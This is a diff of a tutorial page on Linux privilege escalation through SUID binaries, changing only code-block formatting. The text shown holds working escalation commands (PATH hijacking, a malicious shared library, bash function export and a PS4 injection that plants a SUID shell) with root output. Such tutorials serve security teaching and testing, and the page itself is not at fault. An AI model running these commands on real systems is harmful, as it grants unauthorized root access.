@@ -8,12 +8,11 @@ description: Binaries that execute with the permissions of the owner
 
 Set User ID (SUID) binaries are programs that when executed by anyone, will do actions with the permissions of the owner of the program. All programs are files, and the SUID bit on a program is just a permission like read/write/execute that you might be familiar with. The SUID bit can be seen as an `s` character where there would normally be an `x` for executable permissions:
 
-```shell-session
-$ ls -la /usr/bin/sudo
--rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ls -la /usr/bin/sudo
+</strong>-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
    ^  ^       ^     ^
 SUID  SGID   user group
-```
+</code></pre>
 
 When this `s` permission is set by the owner, it means that for anyone executing this program, it will be like the owner of the program ran it. If the file owner is root for example, then you would be executing the program as root. This sounds very dangerous because it is.&#x20;
 
@@ -86,11 +85,10 @@ bash
 
 Then set the PATH variable before executing the vulnerable SUID program:
 
-```shell-session
-$ PATH=/tmp:$PATH ./vulnerable
-# id
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ PATH=/tmp:$PATH ./vulnerable
+</strong># id
 uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
-```
+</code></pre>
 
 ### Replacing the command with a symlink
 
@@ -149,40 +147,36 @@ $ gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
 
 Then when the program loads `/home/user/.config/libcalc.so`, it will actually find our malicious library giving us a shell:
 
-```shell-session
-$ ./vulnerable
-# id
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ./vulnerable
+</strong># id
 uid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
-```
+</code></pre>
 
 ## Old Bash Tricks
 
 Bash is by far the most common shell, and has had a few updates to change certain features. In previous versions of bash, there were some tricks to exploit SUID binaries with functions and environment variables. To check the version of bash use:
 
-```shell-session
-$ /bin/bash --version
-GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
-```
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ /bin/bash --version
+</strong>GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
+</code></pre>
 
 ### Bash < 4.2-048 (absolute path overwrite)
 
 In these older bash versions, it was possible to define a function with the name of a full path to a program. This way, if you would specify the full path to that program, it would instead execute the function you defined with the same name. This makes it possible to overwrite absolute paths like `/usr/sbin/service` ran by SUID binaries, by defining a malicious function with the same name:
 
-```shell-session
-$ function /usr/sbin/service { /bin/bash -p; }  # Define function to get a shell
-$ export -f /usr/sbin/service  # Export function
-$ ./vulnerable
-# id
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ function /usr/sbin/service { /bin/bash -p; }  # Define function to get a shell
+</strong><strong>$ export -f /usr/sbin/service  # Export function
+</strong><strong>$ ./vulnerable
+</strong># id
 uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
-```
+</code></pre>
 
 ### Bash < 4.4 (PS4 variable)
 
 When bash is in debug mode, it has the `PS4` variable which provides a custom prompt when a command is executed by the program. But the variable can run arbitrary commands with the `$()` command substitution syntax. You can set bash in debug mode with `SHELLOPTS=xtrace`, and then just set the `PS4` variable. Getting a direct shell with `/bin/bash -p` has some weird output, so I recommend just copying /bin/bash to another location and setting the SUID bit on it, so you can later run it for your root shell:
 
-```shell-session
-$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/bash; chmod +xs /tmp/bash)' ./vulnerable
-$ /tmp/bash -p
-# id
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/bash; chmod +xs /tmp/bash)' ./vulnerable
+</strong><strong>$ /tmp/bash -p
+</strong># id
 uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
-```
+</code></pre>
